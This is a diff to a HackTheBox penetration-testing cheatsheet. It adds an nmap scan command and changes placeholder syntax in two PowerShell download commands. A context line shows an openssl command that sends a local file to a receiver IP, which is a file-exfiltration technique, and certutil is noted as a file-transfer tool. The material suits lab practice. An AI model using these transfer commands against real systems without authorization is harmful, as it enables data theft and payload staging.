@@ -47,7 +47,10 @@ My personal HackTheBox Cheatsheet from any sources.
   - goproxy
 ### Contents
 #### Nmap
-TODO
+Nmap ("Network Mapper") is a free and open source utility for network discovery and security auditing.\
+```
+nmap -sV -sC -o result.nmap <IP>
+```
 #### AutoRecon
 AutoRecon is a multi-threaded network reconnaissance tool which performs automated enumeration of services.\
 Source: https://github.com/Tib3rius/AutoRecon
@@ -315,11 +318,11 @@ openssl s_client -quiet -connect <RECEIVER_IP>:<PORT> < "<FILE>"
 Source: https://docs.microsoft.com/en-us/powershell/ \
 WebClient:
 ```
-(New-Object System.Net.WebClient).DownloadFile("[URL]", "[PATHTOFILE]")
+(New-Object System.Net.WebClient).DownloadFile("<URL>", "<PATHTOFILE>")
 ```
 Invoke-WebRequest
 ```
-Invoke-WebRequest -Uri [URL] -OutFile [PATHTOFILE]
+Invoke-WebRequest -Uri <URL> -OutFile <PATHTOFILE>
 ```
 #### certutil
 The purpose of the certutil was originally for certificate and CA management, but can also be used for file transfer.\
